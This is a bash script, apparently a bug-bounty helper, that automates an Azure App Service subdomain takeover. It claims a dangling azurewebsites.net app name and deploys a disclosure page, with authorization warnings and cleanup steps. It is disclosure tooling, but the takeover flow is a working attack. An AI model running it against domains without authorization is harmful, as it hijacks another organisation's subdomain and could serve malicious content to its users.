#!/bin/bash
# Azure App Service Subdomain Takeover PoC Helper
# ONLY USE FOR AUTHORIZED BUG BOUNTY TESTING

echo "🔒 Azure Subdomain Takeover - PoC Helper"
echo "========================================"
echo ""
echo "⚠️  WARNING: Only use for authorized bug bounty programs!"
echo ""

# Check if Azure CLI is installed
if ! command -v az &> /dev/null; then
    echo "❌ Azure CLI not found. Install with:"
    echo "   brew install azure-cli"
    exit 1
fi

# Get input
read -p "Enter the vulnerable subdomain (e.g., old-app.company.com): " SUBDOMAIN
read -p "Enter the Azure app name from CNAME (e.g., if CNAME is old-app.azurewebsites.net, enter 'old-app'): " APP_NAME
read -p "Enter your bug bounty username: " RESEARCHER

echo ""
echo "📋 Summary:"
echo "   Vulnerable subdomain: $SUBDOMAIN"
echo "   Azure app name: $APP_NAME"
echo "   Researcher: $RESEARCHER"
echo ""
read -p "Continue? (yes/no): " CONFIRM

if [ "$CONFIRM" != "yes" ]; then
    echo "Aborted."
    exit 0
fi

RESOURCE_GROUP="bugbounty-poc-$(date +%s)"
PLAN_NAME="poc-plan"
LOCATION="eastus"

echo ""
echo "🔐 Step 1: Logging into Azure..."
az login

echo ""
echo "🏗️  Step 2: Creating resource group..."
az group create --name $RESOURCE_GROUP --location $LOCATION

echo ""
echo "📦 Step 3: Creating app service plan (Free tier)..."
az appservice plan create \
    --name $PLAN_NAME \
    --resource-group $RESOURCE_GROUP \
    --sku FREE \
    --location $LOCATION

echo ""
echo "🌐 Step 4: Creating web app with name: $APP_NAME..."
az webapp create \
    --name $APP_NAME \
    --resource-group $RESOURCE_GROUP \
    --plan $PLAN_NAME

if [ $? -ne 0 ]; then
    echo ""
    echo "❌ Failed to create app. Possible reasons:"
    echo "   - App name already taken by someone else"
    echo "   - App name format invalid"
    echo "   - Azure quota exceeded"
    echo ""
    echo "Cleaning up..."
    az group delete --name $RESOURCE_GROUP --yes --no-wait
    exit 1
fi

echo ""
echo "📝 Step 5: Creating PoC HTML file..."
cat > /tmp/poc.html << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Subdomain Takeover - Proof of Concept</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 { color: #d9534f; }
        .info { background: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 20px 0; }
        .contact { background: #d4edda; padding: 15px; border-left: 4px solid #28a745; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Azure Subdomain Takeover Detected</h1>

        <div class="info">
            <h2>Vulnerability Details</h2>
            <p><strong>Vulnerable Subdomain:</strong> $SUBDOMAIN</p>
            <p><strong>Service Type:</strong> Microsoft Azure App Service</p>
            <p><strong>Azure App Name:</strong> $APP_NAME.azurewebsites.net</p>
            <p><strong>Discovered Date:</strong> $(date +%Y-%m-%d)</p>
        </div>

        <div class="contact">
            <h2>Security Researcher Information</h2>
            <p><strong>Researcher:</strong> $RESEARCHER</p>
            <p><strong>Discovery Date:</strong> $(date +%Y-%m-%d)</p>
        </div>

        <h2>What is Subdomain Takeover?</h2>
        <p>This subdomain was pointing to an unclaimed Azure App Service resource.
        An attacker could have claimed this resource and hosted malicious content.</p>

        <h2>Proof of Concept</h2>
        <p>This page demonstrates control over the subdomain. <strong>No malicious actions have been taken.</strong></p>

        <h2>Recommended Fix</h2>
        <ul>
            <li>Remove the DNS CNAME record pointing to $APP_NAME.azurewebsites.net</li>
            <li>If the app is needed, reclaim it in Azure Portal</li>
            <li>Implement DNS monitoring for dangling records</li>
        </ul>

        <p style="text-align: center; margin-top: 30px; color: #666;">
            <small>This is a responsible security disclosure for bug bounty purposes only.</small>
        </p>
    </div>
</body>
</html>
EOF

echo ""
echo "📤 Step 6: Deploying PoC to Azure..."
echo "   Creating deployment package..."

# Create a simple deployment
mkdir -p /tmp/azure-poc-deploy
cp /tmp/poc.html /tmp/azure-poc-deploy/index.html

# Create web.config for proper routing
cat > /tmp/azure-poc-deploy/web.config << 'WEBCONFIG'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap fileExtension=".html" mimeType="text/html" />
        </staticContent>
        <defaultDocument>
            <files>
                <add value="index.html" />
            </files>
        </defaultDocument>
    </system.webServer>
</configuration>
WEBCONFIG

cd /tmp/azure-poc-deploy
zip -r ../deploy.zip .

echo "   Uploading to Azure..."
az webapp deployment source config-zip \
    --resource-group $RESOURCE_GROUP \
    --name $APP_NAME \
    --src /tmp/deploy.zip

echo ""
echo "✅ PoC Deployed!"
echo ""
echo "🌐 Access your PoC at:"
echo "   https://$APP_NAME.azurewebsites.net"
echo ""
echo "📋 Next Steps:"
echo ""
echo "1. Verify the takeover:"
echo "   curl https://$APP_NAME.azurewebsites.net"
echo ""
echo "2. If the target subdomain ($SUBDOMAIN) doesn't resolve yet:"
echo "   - It may take time for DNS to propagate"
echo "   - The company may need to verify domain ownership first"
echo "   - Try: curl -H 'Host: $SUBDOMAIN' https://$APP_NAME.azurewebsites.net"
echo ""
echo "3. Take screenshots for your bug bounty report"
echo ""
echo "4. Report to the bug bounty program IMMEDIATELY"
echo ""
echo "5. After confirmation, delete the resources:"
echo "   az group delete --name $RESOURCE_GROUP --yes"
echo ""
echo "⚠️  Resource Group Name: $RESOURCE_GROUP"
echo "   (Save this for cleanup!)"
echo ""
echo "💾 Saving cleanup command..."
echo "az group delete --name $RESOURCE_GROUP --yes" > ~/Desktop/azure_cleanup_${APP_NAME}.sh
chmod +x ~/Desktop/azure_cleanup_${APP_NAME}.sh
echo "   Saved to: ~/Desktop/azure_cleanup_${APP_NAME}.sh"
echo ""
